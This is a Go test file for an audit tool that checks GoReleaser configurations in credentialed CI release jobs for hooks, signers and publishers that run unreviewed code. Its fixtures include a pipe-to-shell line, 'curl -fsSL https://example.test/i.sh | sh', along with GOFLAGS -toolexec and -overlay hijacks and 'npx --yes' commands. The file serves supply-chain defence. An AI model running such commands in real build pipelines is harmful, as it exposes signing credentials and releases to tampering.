// Copyright (c) 2026 José M. Requena Plens
// SPDX-License-Identifier: MIT

// Tests for the GoReleaser configuration rule 2 reads: the commands GoReleaser
// runs in a credentialed job are judged as though the job's run blocks had
// written them.
package main

import (
	"maps"
	"strings"
	"testing"

	yaml "go.yaml.in/yaml/v3"
)

// goreleaserConfig is a configuration that runs a command at every place
// GoReleaser runs one, and sets what decides how its builds run: an env
// setting GOFLAGS, two before hooks, a build's flags, env and pre and post
// hooks, one of them in the build's dir and one in a dir of its own with an
// env of its own, builds made by another builder, by another tool and by the
// go command named by its path, a universal binary's hook, two upx entries, a
// sign, a binary sign and a docker sign with and without their command, two
// sboms in the dist directory, a docker image's hook, the go binary gomod
// names, a publisher and an after hook.
const goreleaserConfig = `version: 2
env:
  - CGO_ENABLED=0
  - GOFLAGS=-toolexec=/tmp/wrap
before:
  hooks:
    - go mod download
    - cmd: go run ./cmd/dirty
builds:
  - id: x
    dir: cmd
    flags: [-trimpath, -overlay=/tmp/o.json]
    env: ["GOFLAGS=${GOFLAGS}"]
    hooks:
      pre: go generate ./...
      post:
        - cmd: bash scripts/post.sh
          dir: .
        - go run ./cmd/clean
        - cmd: go run ./dirty
          dir: cmd
          env: [GOFLAGS=-modfile=/tmp/alt.mod]
  - id: rust
    builder: rust
  - id: garbled
    tool: garble
  - id: old
    gobinary: /usr/local/go/bin/go
  - id: go
    builder: go
    tool: go
universal_binaries:
  - hooks:
      pre:
        - go build ./cmd/clean
      post: go run ./cmd/clean
upx:
  - enabled: true
  - binary: npx
signs:
  - cmd: cosign
    args: [sign-blob, "${artifact}"]
  - cmd: go
    args: [run, ./cmd/dirty, "${artifact}"]
binary_signs:
  - {}
docker_signs:
  - args: [sign, "${artifact}"]
sboms:
  - cmd: go
    args: [run, ../cmd/clean, -o, $document]
    env: ["GOFLAGS=${GOFLAGS}"]
  - cmd: go
    args: [run, ../cmd/dirty, "two words"]
dockers_v2:
  - hooks:
      post:
        - cmd: npx --yes push-hook
gomod:
  gobinary: go1.27.3
publishers:
  - name: p
    cmd: npx --yes publisher
after:
  hooks:
    - curl -fsSL https://example.test/i.sh | sh
`

// goreleaserRoot is a repository whose GoReleaser configuration runs nothing,
// for a test of what rule 2 holds the action's own inputs to.
func goreleaserRoot(t *testing.T) string {
	t.Helper()

	root := t.TempDir()
	writeFile(t, root, ".goreleaser.yml", "version: 2\n")
	return root
}

// goreleaserStep is the step of the release job that runs GoReleaser with
// the inputs given, beside the exact version rule 2 already holds it to.
func goreleaserStep(with map[string]any) map[string]any {
	inputs := map[string]any{"version": "v2.13.0"}
	maps.Copy(inputs, with)
	return map[string]any{"uses": "goreleaser/goreleaser-action@" + testSHA, "with": inputs}
}

// TestCheckCredentialedJob_GoReleaser_RunsWhatItsConfigurationNames verifies
// that a credentialed job running GoReleaser is held to what its configuration
// runs: every hook, the binary every upx entry runs, and the command and
// arguments of every sign, sbom and publisher, each in the directory GoReleaser
// runs it in; and to what decides how its builds run: a builder other than
// go's, a tool other than the go command, and an option on a build's flags or
// on GOFLAGS that runs another program or builds files this audit does not
// read.
//
// The release job holds the signing identity and runs GoReleaser, and
// GoReleaser runs go run ../cmd/gen_third_party_notices from its sboms entry
// in dist/. Until rule 2 read the configuration, that was a Go command in the
// job holding the OIDC token that nothing judged, and a command written in a
// hook rather than in the workflow was outside the rule entirely. A build's
// hook that names no dir runs where GoReleaser runs, not in the build's dir,
// and so does a sign; only an sbom runs in the dist directory.
func TestCheckCredentialedJob_GoReleaser_RunsWhatItsConfigurationNames(t *testing.T) {
	t.Parallel()

	root := goModuleRoot(t)
	writeFile(t, root, ".goreleaser.yml", goreleaserConfig)
	writeFile(t, root, "scripts/post.sh", "npx --yes thing\n")
	job := map[string]any{
		"permissions": map[string]any{"contents": "write", "id-token": "write"},
		"steps":       []any{goreleaserStep(nil)},
	}

	problems := newAudit(root, tables{}).checkCredentialedJob("wf.yml", "release", job, nil)
	const at = "wf.yml: job release: .goreleaser.yml:"
	outside := ", outside the standard library and this module: " + goGraphReason
	cannot := ", so what it builds cannot be judged"
	want := []string{
		at + "env: GOFLAGS passes -toolexec, which runs every tool of the build through a program this audit does not read" + cannot,
		at + "builds[0].flags passes -overlay, which builds files this audit does not read in place of the module's" + cannot,
		at + "builds[1].builder names rust, a builder that runs a toolchain this audit does not read" + cannot,
		at + "builds[2].tool names garble in place of the go command" + cannot,
		at + "gomod.gobinary names go1.27.3 in place of the go command" + cannot,
		at + "before.hooks[1]: go run ./cmd/dirty imports " + dirtyImports + outside,
		at + "builds[0].hooks.pre: go generate runs whatever the //go:generate lines of its packages name, " +
			"which this audit does not read, so what it runs cannot be judged",
		"wf.yml: job release: scripts/post.sh (via .goreleaser.yml:builds[0].hooks.post[0]) matches " + npxFinding,
		at + "builds[0].hooks.post[2]: go run ./dirty imports " + dirtyImports + outside,
		at + "builds[0].hooks.post[2].env: GOFLAGS passes -modfile, which reads another go.mod in place of the module's" + cannot,
		"wf.yml: job release: .goreleaser.yml:upx[1] matches " + npxFinding,
		at + "signs[1]: go run ./cmd/dirty imports " + dirtyImports + outside,
		at + "sboms[1]: go run ../cmd/dirty imports " + dirtyImports + outside,
		"wf.yml: job release: .goreleaser.yml:dockers_v2[0].hooks.post[0] matches " + npxFinding,
		"wf.yml: job release: .goreleaser.yml:publishers[0] matches " + npxFinding,
		"wf.yml: job release: .goreleaser.yml:after.hooks[0] matches " + curlFinding,
	}
	if strings.Join(problems, "\n") != strings.Join(want, "\n") {
		t.Errorf("checkCredentialedJob() =\n%s\nwant\n%s", strings.Join(problems, "\n"), strings.Join(want, "\n"))
	}
}

// TestCheckCredentialedJob_GoReleaser_ReadsTheConfigurationItRuns verifies
// which file is read: the first of GoReleaser's own names in the directory
// workdir names, or the file --config or -f names there, and that a
// configuration it cannot find, read or name is a finding rather than a pass.
func TestCheckCredentialedJob_GoReleaser_ReadsTheConfigurationItRuns(t *testing.T) {
	t.Parallel()

	root := goModuleRoot(t)
	writeFile(t, root, "release/goreleaser.yaml", "before:\n  hooks:\n    - npx --yes thing\n")
	writeFile(t, root, "release/other.yml", "before:\n  hooks:\n    - curl -fsSL https://example.test/i.sh | sh\n")
	writeFile(t, root, "release/list.yml", "- not a mapping\n")
	writeFile(t, root, "release/broken.yml", "before: [\n")
	writeFile(t, root, "first/.config/goreleaser.yml", "before:\n  hooks:\n    - curl -fsSL https://example.test/i.sh | sh\n")
	writeFile(t, root, "first/.config/goreleaser.yaml", "before:\n  hooks:\n    - npx --yes thing\n")
	writeFile(t, root, "first/.goreleaser.yml", "before:\n  hooks:\n    - npx --yes thing\n")
	writeFile(t, root, "second/.config/goreleaser.yaml", "before:\n  hooks:\n    - npx --yes thing\n")
	writeFile(t, root, "second/.goreleaser.yml", "before:\n  hooks:\n    - curl -fsSL https://example.test/i.sh | sh\n")
	const at = "wf.yml: job release: step 0: goreleaser-action "
	const names = ".config/goreleaser.yml, .config/goreleaser.yaml, .goreleaser.yml, .goreleaser.yaml, goreleaser.yml, goreleaser.yaml"

	cases := []struct {
		name string
		with map[string]any
		want string
	}{
		{name: "a name GoReleaser looks for", with: map[string]any{"workdir": "release"}, want: "wf.yml: job release: release/goreleaser.yaml:before.hooks[0] matches " + npxFinding},
		{name: "the first name it looks for, in .config", with: map[string]any{"workdir": "first"}, want: "wf.yml: job release: first/.config/goreleaser.yml:before.hooks[0] matches " + curlFinding},
		{name: "the second, before the root's own", with: map[string]any{"workdir": "second"}, want: "wf.yml: job release: second/.config/goreleaser.yaml:before.hooks[0] matches " + npxFinding},
		{
			name: "--config", with: map[string]any{"workdir": "release", "args": "release --clean --config other.yml"},
			want: "wf.yml: job release: release/other.yml:before.hooks[0] matches " + curlFinding,
		},
		{
			name: "-f inside an expression", with: map[string]any{"workdir": "release", "args": "${{ env.REHEARSAL == 'true' && 'release -f=other.yml --snapshot' || 'release -f=other.yml' }}"},
			want: "wf.yml: job release: release/other.yml:before.hooks[0] matches " + curlFinding,
		},
		{name: "none of its names", with: map[string]any{"workdir": "cmd"}, want: at + "runs in cmd, which holds none of " + names + ", so what it runs cannot be judged"},
		{name: "a file that is not there", with: map[string]any{"args": "release --config missing.yml"}, want: at + "reads missing.yml, which is not a readable file in this repository, so what it runs cannot be judged"},
		{
			name: "a file outside the repository", with: map[string]any{"args": "release --config ../.goreleaser.yml"},
			want: at + "reads ../.goreleaser.yml, which is not a readable file in this repository, so what it runs cannot be judged",
		},
		{
			name: "a directory outside the repository", with: map[string]any{"workdir": ".."},
			want: at + "runs in .., which holds none of " + names + ", so what it runs cannot be judged",
		},
		{name: "a file only the run knows", with: map[string]any{"args": "release --config ${{ env.CONFIG }}"}, want: at + "reads ${{ env.CONFIG }}, a value only the run knows, so what it runs cannot be judged"},
		{name: "a directory only the run knows", with: map[string]any{"workdir": "${{ env.DIR }}"}, want: at + "runs in ${{ env.DIR }}, a value only the run knows, so what it runs cannot be judged"},
		{name: "not a mapping", with: map[string]any{"workdir": "release", "args": "release -f list.yml"}, want: at + "reads release/list.yml, which does not parse as a GoReleaser configuration, so what it runs cannot be judged"},
		{name: "not YAML", with: map[string]any{"workdir": "release", "args": "release -f broken.yml"}, want: at + "reads release/broken.yml, which does not parse as a GoReleaser configuration, so what it runs cannot be judged"},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			job := map[string]any{
				"permissions": map[string]any{"id-token": "write"},
				"steps":       []any{goreleaserStep(testCase.with)},
			}
			problems := newAudit(root, tables{}).checkCredentialedJob("wf.yml", "release", job, nil)
			if len(problems) != 1 || problems[0] != testCase.want {
				t.Errorf("checkCredentialedJob() = %v, want exactly [%q]", problems, testCase.want)
			}
		})
	}
}

// TestCheckCredentialedJob_GoReleaser_RunsEachCommandWhereGoReleaserDoes
// verifies the directories the commands are resolved from: the dist directory
// the configuration names for an sbom, the workdir for a sign and for the hook
// of a build that names no dir, a publisher's own dir, and a hook entry that
// is neither a string nor a mapping, which GoReleaser would refuse, holds no
// command.
func TestCheckCredentialedJob_GoReleaser_RunsEachCommandWhereGoReleaserDoes(t *testing.T) {
	t.Parallel()

	root := goModuleRoot(t)
	writeFile(t, root, "release/.goreleaser.yml", `dist: ../out/dist
builds:
  - hooks:
      pre:
        - 7
        - go run ../cmd/dirty
sboms:
  - cmd: go
    args: [run, ../../cmd/dirty]
signs:
  - cmd: go
    args: [run, ../cmd/dirty]
publishers:
  - cmd: go run ./dirty
    dir: ../cmd
`)
	job := map[string]any{
		"permissions": map[string]any{"id-token": "write"},
		"steps":       []any{goreleaserStep(map[string]any{"workdir": "release"})},
	}

	problems := newAudit(root, tables{}).checkCredentialedJob("wf.yml", "release", job, nil)
	const at = "wf.yml: job release: release/.goreleaser.yml:"
	outside := " imports " + dirtyImports + ", outside the standard library and this module: " + goGraphReason
	want := []string{
		at + "builds[0].hooks.pre[1]: go run ../cmd/dirty" + outside,
		at + "signs[0]: go run ../cmd/dirty" + outside,
		at + "sboms[0]: go run ../../cmd/dirty" + outside,
		at + "publishers[0]: go run ./dirty" + outside,
	}
	if strings.Join(problems, "\n") != strings.Join(want, "\n") {
		t.Errorf("checkCredentialedJob() =\n%s\nwant\n%s", strings.Join(problems, "\n"), strings.Join(want, "\n"))
	}
}

// buildProblemsOf parses a GoReleaser configuration and returns what
// goreleaserBuildProblems finds in it under the label cfg.
func buildProblemsOf(t *testing.T, config string) []string {
	t.Helper()

	var document map[string]any
	if err := yaml.Unmarshal([]byte(config), &document); err != nil {
		t.Fatalf("yaml.Unmarshal(%q): %v", config, err)
	}
	return goreleaserBuildProblems("cfg", document)
}

// TestGoreleaserBuildProblems_Template_IsAValueOnlyTheRunKnows verifies that
// a GoReleaser template in a GOFLAGS an env list sets, or in a build flag that
// is not an option, is a value only the run knows, as a shell expansion is.
//
// GoReleaser fills in the templates of every env list and of a build's flags,
// from the job's environment among other things, so GOFLAGS={{ .Env.EXTRA }}
// or a flags entry {{ .Env.F }} becomes whatever the run hands it, -toolexec
// included. Both passed with no finding while the audit looked only for $ and
// a backtick. A template inside a go option's value is still accepted, since
// GoReleaser hands each flags entry to go as one argument, so it cannot add an
// option of its own.
func TestGoreleaserBuildProblems_Template_IsAValueOnlyTheRunKnows(t *testing.T) {
	t.Parallel()

	runKnows := ", a value only the run knows" + cannotJudgeBuild
	cases := []struct {
		name   string
		config string
		want   []string
	}{
		{name: "GOFLAGS set to a template", config: "env: [\"GOFLAGS={{ .Env.EXTRA }}\"]\n", want: []string{"cfg:env: GOFLAGS is set to {{ .Env.EXTRA }}" + runKnows}},
		{name: "GOFLAGS set to a template without spaces", config: "env: [\"GOFLAGS={{.Env.EXTRA}}\"]\n", want: []string{"cfg:env: GOFLAGS is set to {{.Env.EXTRA}}" + runKnows}},
		{name: "a template in an option GOFLAGS passes", config: "env: [\"GOFLAGS=-tags={{ .Env.T }}\"]\n", want: []string{"cfg:env: GOFLAGS is set to -tags={{ .Env.T }}" + runKnows}},
		{name: "GOFLAGS a build's env sets", config: "builds:\n  - env: [\"GOFLAGS={{ .Env.EXTRA }}\"]\n", want: []string{"cfg:builds[0].env: GOFLAGS is set to {{ .Env.EXTRA }}" + runKnows}},
		{name: "a flag that is a template", config: "builds:\n  - flags: [-trimpath, \"{{ .Env.F }}\"]\n", want: []string{"cfg:builds[0].flags holds {{ .Env.F }}" + runKnows}},
		{name: "a flag a template chooses", config: "builds:\n  - flags: [\"{{ if .IsSnapshot }}-race{{ end }}\"]\n", want: []string{"cfg:builds[0].flags holds {{ if .IsSnapshot }}-race{{ end }}" + runKnows}},
		{name: "a template in the value of a flag", config: "builds:\n  - flags: [\"-tags={{ .Env.T }}\"]\n"},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			problems := buildProblemsOf(t, testCase.config)
			if strings.Join(problems, "\n") != strings.Join(testCase.want, "\n") {
				t.Errorf("goreleaserBuildProblems() =\n%s\nwant\n%s", strings.Join(problems, "\n"), strings.Join(testCase.want, "\n"))
			}
		})
	}
}

// TestGoreleaserBuildProblems_OverridesAndAFlagsString_AreHeldAsTheBuild
// verifies that the flags and env of a build's overrides are held as the
// build's own are, and that flags written as one string are read word by word.
//
// GoReleaser merges an override's flags over the build's and appends its env
// for the target it names, and reads a flags string as the words it holds, so
// -toolexec on an override or inside one string reached the go command while
// the audit, reading only the build's flags list, found nothing.
func TestGoreleaserBuildProblems_OverridesAndAFlagsString_AreHeldAsTheBuild(t *testing.T) {
	t.Parallel()

	toolexec := " passes -toolexec, which runs every tool of the build through a program this audit does not read" + cannotJudgeBuild
	cases := []struct {
		name   string
		config string
		want   []string
	}{
		{
			name:   "an override's flags",
			config: "builds:\n  - overrides:\n      - goos: linux\n        goarch: amd64\n        flags: [-toolexec=/tmp/w]\n",
			want:   []string{"cfg:builds[0].overrides[0].flags" + toolexec},
		},
		{
			name:   "an override's env",
			config: "builds:\n  - overrides:\n      - goos: linux\n        goarch: amd64\n        env: [GOFLAGS=-toolexec=/tmp/w]\n",
			want:   []string{"cfg:builds[0].overrides[0].env: GOFLAGS" + toolexec},
		},
		{name: "flags written as one string", config: "builds:\n  - flags: -trimpath -toolexec=/tmp/w\n", want: []string{"cfg:builds[0].flags" + toolexec}},
		{name: "an override that changes nothing judged", config: "builds:\n  - overrides:\n      - goos: linux\n        goarch: amd64\n        flags: [-trimpath]\n        env: [CGO_ENABLED=0]\n"},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			problems := buildProblemsOf(t, testCase.config)
			if strings.Join(problems, "\n") != strings.Join(testCase.want, "\n") {
				t.Errorf("goreleaserBuildProblems() =\n%s\nwant\n%s", strings.Join(problems, "\n"), strings.Join(testCase.want, "\n"))
			}
		})
	}
}

// TestCheckCredentialedJob_GoReleaser_AbsolutePaths_AreOutsideTheRepository
// verifies that an absolute --config, hook or publisher dir, or dist names
// nothing in this repository, and is a finding rather than a file or package
// of the checkout.
//
// goreleaser-action changes into workdir, and GoReleaser opens --config as
// written and runs a hook or publisher with its dir, and an sbom with dist, as
// the command's directory, so an absolute one is a path outside the checkout.
// Joined onto workdir it lost its leading slash, and the audit judged the
// file or package the checkout holds at that relative path instead: each case
// below puts a harmless one there, and each passed with no finding.
func TestCheckCredentialedJob_GoReleaser_AbsolutePaths_AreOutsideTheRepository(t *testing.T) {
	t.Parallel()

	const step = "wf.yml: job release: step 0: goreleaser-action "
	const at = "wf.yml: job release: .goreleaser.yml:"
	unresolved := ": go run ./clean names a package this audit cannot resolve (a value only the run knows, or a path outside this repository)" + cannotJudgeBuild
	outside := "reads /abs/x.yml, which is not a readable file in this repository, so what it runs cannot be judged"
	cases := []struct {
		name   string
		with   map[string]any
		files  map[string]string
		config string
		want   string
	}{
		{name: "an absolute --config", with: map[string]any{"args": "release --config /abs/x.yml"}, files: map[string]string{"abs/x.yml": "version: 2\n"}, want: step + outside},
		{
			name: "an absolute -f under a workdir", with: map[string]any{"workdir": "release", "args": "release -f /abs/x.yml"},
			files: map[string]string{"release/abs/x.yml": "version: 2\n"}, want: step + outside,
		},
		{name: "a hook's absolute dir", config: "builds:\n  - hooks:\n      pre:\n        - cmd: go run ./clean\n          dir: /cmd\n", want: at + "builds[0].hooks.pre[0]" + unresolved},
		{name: "a publisher's absolute dir", config: "publishers:\n  - cmd: go run ./clean\n    dir: /cmd\n", want: at + "publishers[0]" + unresolved},
		{
			name: "an absolute dist, where an sbom runs", config: "dist: /cmd/x\nsboms:\n  - cmd: go\n    args: [run, ../clean]\n",
			want: at + "sboms[0]: go run ../clean names a package this audit cannot resolve (a value only the run knows, or a path outside this repository)" + cannotJudgeBuild,
		},
	}

	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			root := goModuleRoot(t)
			for name, content := range testCase.files {
				writeFile(t, root, name, content)
			}
			if testCase.config != "" {
				writeFile(t, root, ".goreleaser.yml", testCase.config)
			}
			job := map[string]any{
				"permissions": map[string]any{"id-token": "write"},
				"steps":       []any{goreleaserStep(testCase.with)},
			}
			problems := newAudit(root, tables{}).checkCredentialedJob("wf.yml", "release", job, nil)
			if len(problems) != 1 || problems[0] != testCase.want {
				t.Errorf("checkCredentialedJob() = %v, want exactly [%q]", problems, testCase.want)
			}
		})
	}
}

// TestCheckCredentialedJob_GoReleaserTwice_IsReadOnce verifies that a job
// running GoReleaser in two steps reads its configuration once, as it reads a
// script two steps run once.
func TestCheckCredentialedJob_GoReleaserTwice_IsReadOnce(t *testing.T) {
	t.Parallel()

	root := t.TempDir()
	writeFile(t, root, ".goreleaser.yml", "before:\n  hooks:\n    - npx --yes thing\n")
	job := map[string]any{
		"permissions": map[string]any{"contents": "write"},
		"steps":       []any{goreleaserStep(nil), goreleaserStep(map[string]any{"args": "release --snapshot"})},
	}
	problems := newAudit(root, tables{}).checkCredentialedJob("wf.yml", "release", job, nil)
	want := "wf.yml: job release: .goreleaser.yml:before.hooks[0] matches " + npxFinding
	if len(problems) != 1 || problems[0] != want {
		t.Errorf("checkCredentialedJob() = %v, want exactly [%q]", problems, want)
	}
}
